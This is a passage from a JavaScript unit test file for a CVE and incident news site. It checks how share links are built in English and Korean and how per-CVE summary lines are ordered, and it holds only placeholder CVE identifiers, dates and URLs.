  assert.equal(shareLink(cve, s, 'en', board, now), 'https://patchticker.com/en/i/CVE-2026-123158');
  const story = { id: 'https://news.ycombinator.com/item?id=50378228', cves: [], first_seen: '2026-11-06T00:00:00Z', summary: { incident: true } };
  assert.equal(shareLink(story, await slug(story.id), 'en', board, now), 'https://patchticker.com/en/i/hn-50378228');

  const boardLink = 'https://patchticker.com/#i=CVE-2026-123158';
  assert.equal(shareLink({ ...cve, summary: undefined }, s, 'ko', board, now), boardLink); // no Summary yet
  assert.equal(shareLink({ ...cve, first_seen: '2026-08-11T23:59:00Z' }, s, 'ko', board, now), boardLink); // past 90 days
  assert.equal(shareLink(cve, undefined, 'ko', board, now), boardLink); // the slug is not ready yet
  const notIncident = { ...story, summary: { incident: false } };
  assert.equal(shareLink(notIncident, await slug(story.id), 'ko', board, now), 'https://patchticker.com/#i=https%3A%2F%2Fnews.ycombinator.com%2Fitem%3Fid%3D50378228');
});

test('each CVE shows its Summary line, else its own record text, in the Incident order (owner, 2026-11-10)', () => {
  const incident = { cves: ['CVE-2026-1001', 'CVE-2026-1002', 'CVE-2026-1003', 'CVE-2026-1004'],
    cve_texts: { 'CVE-2026-1001': 'record one', 'CVE-2026-1003': 'record three' },
    summary: { ko: { cve_lines: [{ cve: 'CVE-2026-1002', text: '둘' }, { cve: 'CVE-2026-1001', text: '하나' }] } } };
  assert.deepEqual(cveLines(incident, 'ko'), [{ cve: 'CVE-2026-1001', text: '하나' }, { cve: 'CVE-2026-1002', text: '둘' },
    { cve: 'CVE-2026-1003', text: 'record three' }]);
  assert.deepEqual(cveLines(incident, 'en').map((l) => l.text), ['record one', 'record three']);
  assert.deepEqual(cveLines({ cves: ['CVE-2026-1001'], cve_texts: { 'CVE-2026-1001': 'x' } }, 'ko'), []);
});
